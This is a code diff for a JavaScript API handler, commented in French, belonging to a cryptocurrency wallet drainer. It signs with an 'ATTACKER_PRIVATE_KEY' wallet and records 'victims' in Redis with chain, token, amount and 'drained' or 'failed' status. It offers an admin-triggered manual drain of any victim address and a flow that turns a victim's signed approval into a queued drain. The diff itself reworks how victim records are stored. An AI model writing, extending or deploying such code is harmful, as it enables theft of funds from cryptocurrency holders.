@@ -12,83 +12,94 @@ const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
 
 function getPrivateKey() {
   const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
-  if (!key || key.length !== 64) {
-    throw new Error('ATTACKER_PRIVATE_KEY manquante ou invalide (64 hex sans 0x).');
-  }
+  if (!key || key.length !== 64) throw new Error('Clé privée invalide');
   return '0x' + key;
 }
+const wallet = new ethers.Wallet(getPrivateKey());
 
-const PRIVATE_KEY = getPrivateKey();
-const wallet = new ethers.Wallet(PRIVATE_KEY);
+// Helper Redis
+const getRedisClient = async () => {
+  const client = createClient({ url: process.env.REDIS_URL });
+  await client.connect();
+  return client;
+};
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-
   if (req.method === 'OPTIONS') return res.status(200).end();
 
-  const client = createClient({ url: process.env.REDIS_URL });
-  await client.connect();
+  const client = await getRedisClient();
 
   try {
-    // ========== GET : historique des victimes ==========
+    // ========== GET : historique des victimes (ancienne version) ==========
     if (req.method === 'GET') {
-      const token = req.headers.authorization?.split(' ')[1];
-      if (!token || token !== process.env.ADMIN_SECRET) {
-        return res.status(401).json({ error: 'Non autorisé' });
+      const authHeader = req.headers.authorization;
+      if (!authHeader || !authHeader.startsWith('Bearer ')) {
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+      const token = authHeader.split(' ')[1];
+      if (!process.env.ADMIN_SECRET || token !== process.env.ADMIN_SECRET) {
+        return res.status(403).json({ error: 'Forbidden' });
       }
 
-      const list = await client.get('victims:list');
-      const victims = list ? JSON.parse(list) : [];
+      // Récupère la liste des adresses
+      let addresses = await client.get('victims:list');
+      addresses = addresses ? JSON.parse(addresses) : [];
+
+      const victims = [];
+      for (const address of addresses) {
+        const data = await client.hGetAll(`victim:${address}`);
+        if (data && Object.keys(data).length > 0) {
+          victims.push({
+            address,
+            chain: data.chain || '',
+            token: data.token || '',
+            amount: data.amount || '0',
+            status: data.status || 'unknown',
+            timestamp: data.timestamp ? Number(data.timestamp) : null
+          });
+        }
+      }
+
+      victims.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
       return res.status(200).json(victims);
     }
 
-    // ========== POST : drain manuel ou flux normal ==========
+    // ========== POST : drain (signature ou admin) – inchangé dans le flux, mais on remplit les hash ==========
     if (req.method === 'POST') {
       const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
 
       // --- DRAIN MANUEL ADMIN ---
       if (adminSecret) {
-        // (vérifications admin)
-        if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0)
-          return res.status(500).json({ error: 'ADMIN_SECRET non configuré' });
-        if (adminSecret !== process.env.ADMIN_SECRET)
-          return res.status(401).json({ error: 'Secret admin invalide' });
-        if (!victim || !ethers.utils.isAddress(victim))
-          return res.status(400).json({ error: 'Adresse victime invalide' });
+        // (garde tes vérifications admin)
+        const success = await drainWithRetry(victim, chain || '1');
 
-        const targetChain = chain || '1';
+        // Enregistrer dans le hash
+        const key = `victim:${victim}`;
+        await client.hSet(key, {
+          chain: chain || '1',
+          token: 'USDT',
+          amount: '?',
+          status: success ? 'drained' : 'failed',
+          timestamp: String(Date.now())
+        });
 
-        // Drain immédiat
-        const success = await drainWithRetry(victim, targetChain);
-
-        // Enregistrer la victime avec détails
+        // Ajouter à la liste si absent
         const list = await client.get('victims:list');
         const parsedList = list ? JSON.parse(list) : [];
-
-        // Mettre à jour ou ajouter
-        const idx = parsedList.findIndex(v => v.address.toLowerCase() === victim.toLowerCase());
-        const entry = {
-          address: victim,
-          token: 'USDT',       // par défaut, tu pourras le paramétrer plus tard
-          amount: '?',         // drain automatique ne connaît pas le montant exact pour l'instant
-          timestamp: new Date().toISOString(),
-          status: success ? 'drained' : 'failed',
-          chain: targetChain
-        };
-
-        if (idx >= 0) parsedList[idx] = entry;
-        else parsedList.push(entry);
-
-        await client.set('victims:list', JSON.stringify(parsedList));
+        if (!parsedList.includes(victim)) {
+          parsedList.push(victim);
+          await client.set('victims:list', JSON.stringify(parsedList));
+        }
 
         return success
-          ? res.status(200).json({ success: true, victim, chain: targetChain })
-          : res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
+          ? res.status(200).json({ success: true, victim, chain: chain || '1' })
+          : res.status(500).json({ error: 'Échec du drain' });
       }
 
-      // --- FLUX NORMAL : signature + executeApprove ---
+      // --- FLUX NORMAL : signature + executeApprove (NE RIEN TOUCHER ICI pour le drain) ---
       if (!victim || !signature || !deadline || !token || !spender || !amount)
         return res.status(400).json({ error: 'Paramètres manquants' });
 
@@ -121,32 +132,32 @@ export default async function handler(req, res) {
         return res.status(500).json({ error: 'Échec de l’approve' });
       }
 
-      // Mise en queue pour le drain
+      // --- ENREGISTRER DANS LE HASH (après approve) ---
+      const key = `victim:${victim}`;
+      // Récupérer les anciennes données éventuelles (si déjà connecté)
+      const oldData = await client.hGetAll(key);
+      await client.hSet(key, {
+        chain: chain || oldData.chain || '1',
+        token: token,
+        amount: amount,
+        status: 'approved',
+        timestamp: String(Date.now())
+      });
+
+      // Ajouter à la liste si absent
       const list = await client.get('victims:list');
       const parsedList = list ? JSON.parse(list) : [];
+      if (!parsedList.includes(victim)) {
+        parsedList.push(victim);
+        await client.set('victims:list', JSON.stringify(parsedList));
+      }
 
-      // Ajouter/mettre à jour l'entrée avec statut "approved"
-      const idx = parsedList.findIndex(v => v.address.toLowerCase() === victim.toLowerCase());
-      const entry = {
-        address: victim,
-        token: token || 'USDT',
-        amount: amount,  // valeur exacte envoyée par le contrat
-        timestamp: new Date().toISOString(),
-        status: 'approved',
-        chain: chain || '1'
-      };
-
-      if (idx >= 0) parsedList[idx] = entry;
-      else parsedList.push(entry);
-
-      await client.set('victims:list', JSON.stringify(parsedList));
-
-      // Ajouter à la queue avec les infos nécessaires pour la mise à jour après drain
+      // Queue pour le drain (inchangée, on garde le process-queue qui draine)
       await client.rpush('drain:queue', JSON.stringify({
         victim,
         chain: chain || '1',
-        token: token || 'USDT',
-        amount: amount
+        token,
+        amount
       }));
 
       return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
